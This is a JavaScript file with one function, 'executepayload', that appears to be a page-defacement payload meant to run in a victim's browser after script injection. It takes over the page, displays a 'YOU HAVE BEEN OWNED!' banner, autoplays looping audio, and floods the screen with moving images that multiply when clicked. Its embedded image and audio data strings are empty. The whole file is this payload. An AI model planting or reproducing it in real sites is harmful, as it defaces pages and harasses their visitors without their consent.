function executepayload(max,message){
    
    document.body.style.overflow='hidden';
    document.body.style.margin='0px';

    document.body.style.background="url('data:image/gif;base64,')";

    if(message != ""){
	var msg=document.createElement('div');
	msg.style.border='solid 1px';
	msg.style.width='600px';
	msg.style.fontSize='72pt';
	msg.style.fontFamily='arial';
	msg.style.textAlign='center';
	msg.style.background='#666666';
	msg.style.margin='200px auto';
	msg.style.opacity=0.8;
	message = typeof message !== 'undefined' ? message : "YOU HAVE BEEN OWNED!";
	msg.innerHTML=message;
	msg.zIndex='1000';
	document.body.appendChild(msg);
    }



    var image = 'data:image/gif;base64,';

    var audio = document.createElement('audio');
    audio.setAttribute('loop','loop');
    audio.setAttribute('autoplay','autoplay');

    audio.innerHTML = '<source src="data:audio/ogg;base64," type="audio/ogg"/>';

    document.body.appendChild(audio);

    var loaded=0;
    var arr=[];
    max = typeof max !== 'undefined' ? max : 80;
    var time=0;

    var spawn=function() {
	var img=document.createElement('img');
	img.style.MozTransform = "";
	img.style.webkitTransform = "";
	var vx = 0;
	var vy = 0;
	while(vx == 0 && vy ==0){
	    vx = (Math.random()*30-15)|0;
	    vy = (Math.random()*30-15)|0;
	}
	
	var obj=[img, (window.innerWidth*Math.random())|0, (window.innerHeight*Math.random())|0, 0, vx, vy, 0, 0, -1];
	img.src = image;
	obj[3] = ((Math.atan(obj[5]/obj[4]) * (57.3))|0);
	if(vx < 0 && vy >= 0){
	    obj[3] *= -1;
	    img.style.MozTransform += "scaleX(-1)";
	    img.style.webkitTransform += "scaleX(-1)";
	}
	else if(vx < 0 && vy <= 0){
	    obj[3] *= -1;
	    img.style.MozTransform += "scaleX(-1)";
	    img.style.webkitTransform += "scaleX(-1)";
	}
	arr.push(obj);

	img.style.position='absolute';
	img.style.left=(obj[1])+'px';
	img.style.top=(obj[2])+'px';
	
	img.style.MozTransform += "rotate(" + obj[3] +"deg)";
	img.style.webkitTransform += "rotate(" + obj[3] +"deg)";
	img.addEventListener('click', (
				 function(obj) {
				     return function() {
					 for(var j=0; j<5; ++j) {
					     var img=document.createElement('img');
					     var o=[img, obj[1]+obj[0].width/2, obj[2]+obj[0].height/2, 0, obj[4], obj[5],0, 0, 8];
					     
					     img.src='data:image/gif;base64,';

					     img.style.position='absolute';
					     img.style.left=(obj[1])+'px';
					     img.style.top=(obj[2])+'px';
					     arr.push(o);
					     document.body.appendChild(img);
					 }
					 obj[7]=1;
					 spawn();
					 spawn();
				     };
				 })(obj), true);
	document.body.appendChild(img);
    };

    var img=document.createElement('img');
    img.addEventListener('load', function() { ++loaded; }, true);
    img.src=image;


    var intv=setInterval(
	function() {
	    for(var i=0; i<max; ++i) {
		spawn();
	    }
	    if(arr.length<max) return;
	    clearInterval(intv);
	    setInterval(
		function() {
		    for(var i=0; i<arr.length; ++i) {
			if(arr[i][8]>0) { --arr[i][8]; }
			if(arr[i][7] || arr[i][8]==0) { arr[i][0].parentNode.removeChild(arr[i][0]); arr.splice(i,1); --i; continue; }
			arr[i][1]+=arr[i][4];
			arr[i][2]+=arr[i][5];
			arr[i][0].style.left=(arr[i][1])+'px';
			arr[i][0].style.top=(arr[i][2])+'px';
			if(arr[i][1]>window.innerWidth) {
			    arr[i][1]=0;
			}
			else if(arr[i][1]<0){
			    arr[i][1]=window.innerWidth;
			}
			if(arr[i][2]>window.innerHeight) {
			    arr[i][2]=0;
			}
			else if(arr[i][2]<0){
			    arr[i][2]=window.innerHeight;
			}
		    }
		}, 20);
	}, 50);

}
